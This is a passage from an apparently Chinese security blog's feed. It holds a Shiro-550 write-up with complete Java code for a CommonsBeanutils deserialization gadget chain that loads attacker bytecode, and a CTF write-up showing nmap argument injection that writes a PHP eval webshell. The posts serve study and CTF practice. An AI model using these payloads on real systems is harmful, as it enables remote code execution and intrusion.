function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field bytecodesField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D://netcat//Test.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> codes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//</span>        Field tfactoryField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tfactoryField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tfactoryField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BeanComparator beanComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TransformingComparator<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Integer<span class="token operator">></span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        PriorityQueue<span class="token operator">&lt;</span>Object<span class="token operator">></span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>PriorityQueue<span class="token operator">></span> priorityQueueClass <span class="token operator">=</span> PriorityQueue<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field comparator <span class="token operator">=</span> priorityQueueClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparator<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparator<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span> beanComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        unserialize("ser.bin");</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">unserialize</span><span class="token punctuation">(</span>String Filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>Filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>有一个值得说的点就是57行<code>new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));</code>那里，因为这个是CC3的东西，为什么可以拿来攻击无CC依赖的shiro呢？<br>因为这里我们只是利用<code>TransformingComparator</code>来占位，以便于在<code>priorityQueue.add(templates)</code>的时候不报错。并且我们在反序列之前修改了<code>priorityQueue</code>的<code>comparator</code>。因此序列化的内容不包含CC链的东西，所以可以攻击无CC依赖的shiro。</p><h3 id="攻击小插曲："><a href="#攻击小插曲：" class="headerlink" title="攻击小插曲："></a>攻击小插曲：</h3><h4 id="CC依赖问题"><a href="#CC依赖问题" class="headerlink" title="CC依赖问题"></a>CC依赖问题</h4><p>正常来说这里应该是不会攻击成功的，但是不知道为什么我本地好像JDK包里面导入了CC链还是怎么的，这里是攻击成功了。因为这里的CB链子其实还是包含CC依赖的，在哪呢？<br>我们把目光聚焦<code>BeanComparator</code>：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.png"><br>我们利用的是这个构造函数，这个构造函数里的<code>ComparableComparator</code>其实是需要有CC依赖的。因此我们需要利用到另外一个构造函数：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">BeanComparator</span><span class="token punctuation">(</span> String property<span class="token punctuation">,</span> Comparator comparator <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">setProperty</span><span class="token punctuation">(</span> property <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>comparator <span class="token operator">=</span> comparator<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>comparator <span class="token operator">=</span> ComparableComparator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>这个构造函数需要我们传入一个<code>Comparator</code>，并且这个Comparator还需要满足<code>implements Comparator, Serializable</code>。</p><p>快速寻找无疑就是利用Python脚本跑了：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">seriable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"seriable.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">commpotor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"Compotor.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> datalist1 <span class="token operator">=</span> seriable<span class="token punctuation">(</span><span class="token punctuation">)</span>list2 <span class="token operator">=</span> commpotor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> list1<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token keyword">in</span> list2<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p><a href="https://youngkylin.yuque.com/attachments/yuque/0/2023/txt/28868587/1678504014327-69354a48-1737-4a38-af79-355ffa031449.txt?_lake_card=%7B%22src%22:%22https://youngkylin.yuque.com/attachments/yuque/0/2023/txt/28868587/1678504014327-69354a48-1737-4a38-af79-355ffa031449.txt%22,%22name%22:%22Compotor.txt%22,%22size%22:3539,%22ext%22:%22txt%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22ufa1a6d93-32a4-45e2-ab85-0f1f04e810b%22,%22taskType%22:%22transfer%22,%22type%22:%22text/plain%22,%22mode%22:%22title%22,%22id%22:%22uf0497c8c%22,%22card%22:%22file%22%7D">Compotor.txt</a><a href="https://youngkylin.yuque.com/attachments/yuque/0/2023/txt/28868587/1678504014383-0fc4393f-6ce0-4642-bc3c-39e7c2076b9c.txt?_lake_card=%7B%22src%22:%22https://youngkylin.yuque.com/attachments/yuque/0/2023/txt/28868587/1678504014383-0fc4393f-6ce0-4642-bc3c-39e7c2076b9c.txt%22,%22name%22:%22seriable.txt%22,%22size%22:59753,%22ext%22:%22txt%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u068ef607-840a-41a8-a1b5-a992126f254%22,%22taskType%22:%22transfer%22,%22type%22:%22text/plain%22,%22mode%22:%22title%22,%22id%22:%22u4eb8801b%22,%22card%22:%22file%22%7D">seriable.txt</a><br>结果：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png"><br>下面还有很多，随便挑一个<br>这里就选第一个了，因为<code>public+jdk自带+无参构造</code><br>完善之后的payload:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>security<span class="token punctuation">.</span>c14n<span class="token punctuation">.</span>helper<span class="token punctuation">.</span>AttrCompare<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span>BeanComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span>PropertyUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span>TiedMapEntry<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>collection<span class="token punctuation">.</span>CompositeCollection<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>ComparableComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InstantiateTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>omg<span class="token punctuation">.</span>SendingContext<span class="token punctuation">.</span>RunTime<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//cc3</span>        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>TemplatesImpl<span class="token operator">></span> templatesClass <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field nameField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field bytecodesField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D://netcat//Test.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> codes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//</span>        Field tfactoryField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tfactoryField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tfactoryField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BeanComparator beanComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token string">"outputProperties"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">AttrCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TransformingComparator<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Integer<span class="token operator">></span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        PriorityQueue<span class="token operator">&lt;</span>Object<span class="token operator">></span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>PriorityQueue<span class="token operator">></span> priorityQueueClass <span class="token operator">=</span> PriorityQueue<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field comparator <span class="token operator">=</span> priorityQueueClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparator<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparator<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span> beanComparator<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        serialize(priorityQueue);</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">unserialize</span><span class="token punctuation">(</span>String Filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>Filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29.png"><br>一样可以弹出计算器</p><h4 id="CB版本问题"><a href="#CB版本问题" class="headerlink" title="CB版本问题"></a>CB版本问题</h4><p>如果我们用yso那个工具生成的payload去打这个也会出现问题<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png"><br>生成ser.bin之后我们攻击之后会报错<br>具体报错原因如下：</p><pre class=" language-txt"><code class="language-txt">Caused by: java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</code></pre><p>报了一个ID不匹配的问题<br>原因是我们本地的shiro版本是1.8.3,而yso工具的shiro版本是1.9.2.因为版本差别比较大，所以攻击失败了</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020年朱雀杯-Nmap</title>
      <link href="/2022/12/01/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap%20wp/"/>
      <url>/2022/12/01/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap%20wp/</url>
      
        <content type="html"><![CDATA[<h2 id="深层次剖析！！！"><a href="#深层次剖析！！！" class="headerlink" title="深层次剖析！！！"></a>深层次剖析！！！</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>[2020年朱雀杯]</strong> 和 <strong>[BUUCTF 2018]Online Tool</strong>的题目似乎是一样的，不同在于朱雀杯没有给出源码，主要考察的都是<strong>nmap一句话木马写入</strong>。本篇文章细致讲解输入时<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong> 两个函数所进行的步骤。</p><span id="more"></span><h2 id="知识巩固"><a href="#知识巩固" class="headerlink" title="知识巩固"></a>知识巩固</h2><p>关于nmap的输出命令：<br>翻阅nmap中文手册，发现主要只有四种：</p><ul><li>-oN &lt; filespec &gt; (标准输出)</li><li>-oX &lt; filespec&gt;  (XML输出)   </li><li>-oS &lt; filespec&gt; (ScRipT KIdd|3 oUTpuT)   </li><li>-oG &lt; filespec&gt; (Grep输出)</li></ul><p>其中主要就是 <strong>-oN</strong> 和 <strong>-oG</strong> 为主，我们看一下他们的区别：（本地测试一下）<br><img src="/Blogimages/3/1.png"><br>不难发现两件事：</p><ol><li>我们可以构造任意文件内容</li><li>文件的名字，<strong>包括后缀</strong>也是我们自己定义</li></ol><p> 接下来我们来研究一个有意思的东西：<br> 如果使用nmap写入一句话木马不用引号包起来会怎么样：<img src="/Blogimages/3/2.png"><br> 直接输入的话是无法生成文件的，必须给<?= @ eval($_REQUEST[1]);?>引号包起来才能正确执行命令，除此之外还有什么办法能执行呢。</p><p>！！ <em><strong>\转义</strong></em> ！！<br>！！ <em><strong>\转义</strong></em> ！！<br>！！ <em><strong>\转义</strong></em> ！！</p><p><img src="/Blogimages/3/3.png"><br>把这些会引起歧义的符号全部转义就能执行命令，并且将木马生成在php文件中。这将对绕过 escapeshellarg 和 escapeshellcmd 很有用</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>进入页面，先输入<strong>127.0.0.1</strong>看一下会怎么样<br><img src="/Blogimages/3/4.png"></p><p>发现结果和我们本地非常相似：<br><img src="/Blogimages/3/5.png"><br>再尝试一下命令：</p><blockquote><p>127.0.0.1 | ls</p></blockquote><p><img src="/./../Blogimages/3/6.png"></p><p>可以看到本地是可以执行的，那我们试一下题目环境<br><img src="/Blogimages/3/7.png"><br>发现被转义了<br></br><br></br><br>只能另辟蹊径，我们直接试着写入一句话木马</p><p><code> &#39;&lt;?php eval($_GET[1])?&gt;&#39; -oN 1.php</code></p><p><img src="/Blogimages/3/8.png"><br>结果发现回显是Hacker，可能把php过滤了</p><h3 id="过滤php怎么办"><a href="#过滤php怎么办" class="headerlink" title="过滤php怎么办"></a>过滤php怎么办</h3><blockquote><p>1.在一句话木马中的解决办法<br> </br><br> </br><br>利用短标签：<?=eval($_GET[1])?></p></blockquote><blockquote><p>后缀为php的解决办法<br></br><br></br><br>后缀改为phtml，也会解析成php文件</p></blockquote><p>接下来再试着写入一句话木马：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 